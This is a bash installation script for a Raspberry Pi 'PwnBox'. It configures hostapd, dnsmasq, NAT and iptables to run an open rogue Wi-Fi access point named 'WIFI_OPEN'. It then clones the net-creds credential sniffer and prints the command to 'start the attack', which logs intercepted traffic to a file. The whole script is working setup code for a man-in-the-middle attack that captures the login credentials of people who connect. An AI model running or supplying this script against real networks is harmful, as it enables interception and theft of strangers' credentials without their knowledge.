#!/bin/bash
########################
# PwnBox installation script
# author : 
# date : 310519 - v1
########################
# ---------------------------------------------
#
# VERIFY RUN AS ROOT
#
# ---------------------------------------------
echo "
██████╗ ██╗    ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗
██╔══██╗██║    ██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝
██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗
██║     ╚███╔███╔╝██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
"
if [[ $EUID -ne 0 ]]; then
   echo "Work like a true hacker ! run the script as ROOT !"
   exit 1
fi
# ---------------------------------------------
#
# INSTALLING DEPENDENCIES
#
# ---------------------------------------------
# ---------------------------------------------
# check and install dependencies and prerequies
# ---------------------------------------------
exists()
{
  command -v "$1" >/dev/null 2>&1
}
echo "---------------------------------------------"
echo "installing prerequies"
echo "---------------------------------------------"
## Git ##
if exists git; then
  echo 'The program Git exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing Git..'
  apt-get install git -y
fi
## curl ##
if exists curl; then
  echo 'The program curl exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing curl ..'
  apt-get install curl -y
fi
echo "---------------------------------------------"
echo "installing dependencies"
echo "---------------------------------------------"
## hostapd ##
if exists hostapd; then
  echo 'The program hostapd exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing hostapd ..'
  apt-get install hostapd -y
fi
## dnsmasq ##
if exists dnsmasq; then
  echo 'The program dnsmasq exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing dnsmasq ..'
  apt-get install dnsmasq -y
fi
## apache2 ##
if exists apache2; then
  echo 'The program apache2 exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing apache2 ..'
  apt-get install apache2 -y
fi
## php ##
if exists php; then
  echo 'The program php exists!'
else
  echo 'Your system does not have the program'
  echo '###Installing php ..'
  apt-get install php -y
fi
# ---------------------------------------------
#
# BACKUPING CONFIGURATIONS FILES
#
# ---------------------------------------------
# ---------------------------------------------
# BACKUP IN  /home/pi/backup/
# ---------------------------------------------
echo "---------------------------------------------"
echo "backup full configuration files"
echo "---------------------------------------------"
mkdir /home/pi/backup
cp /etc/network/interfaces /home/pi/backup/
cp /proc/sys/net/ipv4/ip_forward /home/pi/backup/
cp /etc/apache2/apache2.conf  /home/pi/backup/
cp /etc/dhcpcd.conf /home/pi/backup/
cp /etc/dnsmasq.conf /home/pi/backup/
iptables-save > /home/pi/backup/iptables.backup
# ---------------------------------------------
#
# CONFIGURE THE NETWORK
#
# ---------------------------------------------
echo "---------------------------------------------"
echo "bypass the dhcpcd.conf ..."
echo "---------------------------------------------"
echo "denyinterfaces eth0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan1" >> /etc/dhcpcd.conf
#########################################################
#########################################################
echo "---------------------------------------------"
echo " Now editing the ip configuration"
echo "---------------------------------------------"
echo "
auto wlan1
auto eth0
allow-hotplug wlan1
iface wlan1 inet static
    address 192.168.50.1
    netmask 255.255.255.0
    network 192.168.50.0
allow-hotplug eth0
iface eth0 inet dhcp
" > /etc/network/interfaces
# ---------------------------------------------
#
# CONFIGURE THE DNS
#
# ---------------------------------------------
#########################################################
#########################################################
echo "---------------------------------------------"
echo "Now configuring dnsmasq"
echo "---------------------------------------------"
echo "
interface=wlan1
listen-address=192.168.50.1
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
dhcp-range=192.168.50.50,192.168.50.150,12h
listen-address=192.168.50.1
" >> /etc/dnsmasq.conf
# ---------------------------------------------
#
# CONFIGURE HOSTAPD
#
# ---------------------------------------------
#########################################################
#########################################################
echo "---------------------------------------------"
echo "Now creating the wifi.conf for hostapd"
echo "---------------------------------------------"
# generating the defaut configuration file for exemple
touch /home/pi/wifi.conf
echo "
interface=wlan1
driver=nl80211
ssid=WIFI_OPEN
hw_mode=g
channel=0
ieee80211d=1
country_code=FR
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" >> /home/pi/wifi.conf
echo "---------------------------------------------"
echo "configuring the NAT"
echo "---------------------------------------------"
sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
echo "---------------------------------------------"
echo "configuring IPTABLES"
echo "---------------------------------------------"
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sh -c "iptables-save > /etc/iptables.ipv4.nat"
echo "up iptables-restore < /etc/iptables.ipv4.nat" >> /etc/network/interfaces
echo "---------------------------------------------"
echo "configuring PERSISTENT ROUTING"
echo "---------------------------------------------"
sed -ir 's/#{1,}?net.ipv4.ip_forward ?= ?(0|1)/net.ipv4.ip_forward = 1/g' /etc/sysctl.conf
echo "---------------------------------------------"
echo "configuring ROGUE AP FOR MITM"
echo "---------------------------------------------"
cd /root
git clone https://github.com/DanMcInerney/net-creds MITMHTTP
cd MITMHTTP
echo "you are in : $(pwd)" 
echo "To start the attack run this cmd line : "
echo "python net-creds.py -i eth0 >> live_capture.log"
